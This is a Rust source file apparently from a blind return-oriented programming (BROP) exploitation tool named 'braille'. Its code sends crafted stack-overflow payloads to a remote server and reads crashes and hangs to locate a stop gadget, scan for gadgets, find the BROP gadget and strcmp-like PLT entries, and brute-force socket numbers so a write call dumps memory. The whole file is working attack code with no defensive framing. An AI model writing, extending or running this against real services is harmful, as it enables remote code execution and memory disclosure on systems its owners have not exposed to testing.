use std::fmt;
use std::ops;

use crate::{
    braille::{Braille, MAX_GADGET_SEARCHING_SIZE},
    cluster::{Cluster, Frame, FrameLike, Word, WordLike},
    payload::Payload,
    response::{Response, ReturnCode, ReturnVal},
};

#[derive(Debug, Clone, PartialEq)]
pub struct Gadget(pub Frame);

#[derive(Debug)]
pub struct Error {
    gadget: Gadget,
    msg: String,
}

impl FrameLike for Gadget {
    fn to_frame(&self) -> Frame {
        self.0.to_owned()
    }

    fn from_frame(frame: Frame) -> Self {
        Self(frame)
    }
}

impl Gadget {
    pub fn is_brop_gadget(&self, braille: &mut Braille) -> Result<bool, Error> {
        // gadget shouldn't drive server to dead loop.
        if let Some(mut payload) = Payload::till_return_address(braille) {
            payload.append(Cluster::Frame(self.to_frame()));
            for _ in 1..=10 {
                payload.append(Cluster::Frame(Frame::from_u64(0xdead_beef_dead_beef)));
            }
            if let Some(ReturnCode::Crash) = braille.probe(&payload) {
                // should crash if gadget is stop gadget
            } else {
                return Ok(false);
            }
        } else {
            return Err(Error {
                gadget: self.to_owned(),
                msg: String::from("cannot craft payload till return address"),
            });
        }
        if let Some(payload) = Payload::craft_brop_payload(braille, self) {
            if let Some(ReturnCode::Infinite) = braille.probe(&payload) {
                Ok(true)
            } else {
                Ok(false)
            }
        } else {
            Err(Error {
                gadget: self.to_owned(),
                msg: String::from("cannot craft brop payload"),
            })
        }
    }

    pub fn find_strcmp_plt_items(braille: &mut Braille) -> Option<()> {
        let plt_items = braille.get_plt_items()?.to_owned();
        let mut find = false;
        for item in plt_items.0.iter() {
            if item.is_strcmp_like(braille) {
                find = true;
                match braille.strcmp_items.as_mut() {
                    None => braille.strcmp_items = Some(Gadgets(vec![item.to_owned()])),
                    Some(gadgets) => gadgets.push(item.to_owned()),
                }
            }
        }

        if find {
            Some(())
        } else {
            None
        }
    }

    fn is_strcmp_like(&self, braille: &mut Braille) -> bool {
        let readable_addr = match braille.get_possible_return_address() {
            Some(addr) => addr,
            None => return false,
        }
        .to_owned();
        let brop_gadgets = match braille.get_brop_gadgets() {
            Some(brop_gadgets) => brop_gadgets,
            None => return false,
        }
        .to_owned();
        for brop_gadget in brop_gadgets.0.iter() {
            let payload = match Payload::craft_strcmp_payload(
                braille,
                self,
                brop_gadget,
                readable_addr.to_owned(),
                Frame::from_u64(0x0),
            ) {
                Some(payload) => payload,
                None => return false,
            };
            if let Some(ReturnCode::Crash) = braille.probe(&payload) {
                // when probing made server crashed, continue the code flow, otherwise return
            } else {
                continue;
            }

            let payload = match Payload::craft_strcmp_payload(
                braille,
                self,
                brop_gadget,
                Frame::from_u64(0x0),
                readable_addr.to_owned(),
            ) {
                Some(payload) => payload,
                None => return false,
            };
            if let Some(ReturnCode::Crash) = braille.probe(&payload) {
                // when probing made server crashed, continue the code flow, otherwise return
            } else {
                continue;
            }

            let payload = match Payload::craft_strcmp_payload(
                braille,
                self,
                brop_gadget,
                Frame::from_u64(0x0),
                Frame::from_u64(0x0),
            ) {
                Some(payload) => payload,
                None => return false,
            };
            if let Some(ReturnCode::Crash) = braille.probe(&payload) {
                // when probing made server crashed, continue the code flow, otherwise return
            } else {
                continue;
            }

            let payload = match Payload::craft_strcmp_payload(
                braille,
                self,
                brop_gadget,
                readable_addr.to_owned(),
                readable_addr.to_owned(),
            ) {
                Some(payload) => payload,
                None => return false,
            };
            if let Some(ReturnCode::Crash) = braille.probe(&payload) {
                // when probing made server crashed, continue the code flow, otherwise return
            } else {
                continue;
            }
            println!("{} -> {}", self, brop_gadget);
            return true;
        }
        false
    }

    pub fn is_write_like(&self, braille: &mut Braille) -> bool {
        let strcmp_items = match braille.get_strcmp_plt_items() {
            Some(gadgets) => gadgets,
            None => return false,
        }
        .to_owned();
        let brop_gadgets = match braille.get_brop_gadgets() {
            Some(gadgets) => gadgets,
            None => return false,
        }
        .to_owned();
        let write_gadgets = match braille.get_gadgets() {
            Some(gadgets) => gadgets,
            None => return false,
        }
        .to_owned();

        let start = 4;
        for strcmp in strcmp_items.0.iter() {
            for brop in brop_gadgets.0.iter() {
                for write in write_gadgets.0.iter() {
                    for sock in start..=(start + 1024) {
                        let payload = match Payload::craft_write_payload(
                            braille, write, brop, strcmp, sock, 0x3000,
                        ) {
                            Some(payload) => payload,
                            None => return false,
                        };
                        println!("sock: {}, dump: {:?}", sock, braille.probe(&payload));
                    }
                }
            }
        }
        true
    }

    pub fn find_stop_gadget(braille: &mut Braille) -> Option<Self> {
        let mut payload = Payload::till_return_address(braille)?;
        let mut stop_gadget = Vec::with_capacity(8);
        let mut infinite_flag = false;

        for _ in 1..=8 {
            payload.append(Cluster::Word(Word(stop_gadget.to_owned())));
            if !infinite_flag {
                match braille.stack_read_byte(&payload) {
                    Ok(byte) => {
                        stop_gadget.push(byte);
                    }
                    Err(Some(Response {
                        code: ReturnCode::Infinite,
                        value: ReturnVal::Byte(byte),
                    })) => {
                        stop_gadget.push(byte);
                        infinite_flag = true;
                    }
                    _ => return None,
                }
            } else {
                let mut start = 0u8;
                loop {
                    if let Err(Some(Response {
                        code: ReturnCode::Infinite,
                        value: ReturnVal::Byte(byte),
                    })) = braille.stack_read_byte_start_from(start, &payload)
                    {
                        stop_gadget.push(byte);
                    } else {
                        start += 1;
                    }
                }
            }
        }
        if infinite_flag {
            Some(Self(Frame::from_vec(stop_gadget)))
        } else {
            None
        }
    }

    pub fn find_gadgets(braille: &mut Braille) -> Option<()> {
        let stop_gadget = braille.get_stop_gadget()?.to_owned();
        let payload = Payload::till_return_address(braille)?;
        let addr = braille.get_possible_return_address()?.to_owned() & 0xffff_ffff_ffff_0000;
        let mut far = 1;

        loop {
            if far > MAX_GADGET_SEARCHING_SIZE {
                return Some(());
            }
            let addr = addr.to_owned() + far;
            far += 1;
            let send = {
                let mut send = payload.to_owned();
                send.append(Cluster::Frame(addr.to_owned()));
                for _ in 1..=10 {
                    send.append(Cluster::Frame(stop_gadget.to_frame()));
                }
                send
            };
            let probe_result = braille.probe(&send)?;
            match probe_result {
                ReturnCode::NoCrash | ReturnCode::Infinite => {
                    let gadget = Gadget(addr);
                    match braille.gadgets.as_mut() {
                        None => braille.gadgets = Some(Gadgets(vec![gadget])),
                        Some(vec) => {
                            vec.push(gadget.to_owned());
                        }
                    }
                }
                _ => {
                    continue;
                }
            }
        }
    }

    pub fn find_brop_gadgets(braille: &mut Braille) -> Option<Gadgets> {
        let gadgets = braille.get_gadgets()?.0.to_owned();
        let mut brop_gadgets: Vec<Gadget> = vec![];
        for gadget in gadgets {
            if let Ok(true) = gadget.is_brop_gadget(braille) {
                brop_gadgets.push(gadget);
            }
        }
        Some(Gadgets(brop_gadgets))
    }

    pub fn to_rsi_gadget(&self) -> Gadget {
        Gadget::from_u64(self.to_u64() + 7)
    }

    pub fn to_rdi_gadget(&self) -> Gadget {
        Gadget::from_u64(self.to_u64() + 9)
    }
}

impl ops::Add<u64> for Gadget {
    type Output = Self;

    fn add(self, rhs: u64) -> Self::Output {
        Gadget::from_u64(self.to_u64() + rhs)
    }
}

impl ops::Sub<u64> for Gadget {
    type Output = Self;

    fn sub(self, other: u64) -> Self::Output {
        Gadget::from_u64(self.to_u64() - other)
    }
}

impl fmt::Display for Gadget {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        self.0.fmt(f)
    }
}

#[derive(Debug, Clone)]
pub struct Gadgets(pub Vec<Gadget>);

impl Gadgets {
    pub fn new() -> Gadgets {
        Gadgets(Vec::new())
    }

    pub fn push(&mut self, value: Gadget) {
        self.0.push(value)
    }

    pub fn len(&self) -> usize {
        self.0.len()
    }

    pub fn contains(&self, value: &Gadget) -> bool {
        self.0.contains(value)
    }
}

impl fmt::Display for Gadgets {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        for gadget in self.0.iter() {
            gadget.fmt(f)?;
            writeln!(f)?;
        }
        Ok(())
    }
}
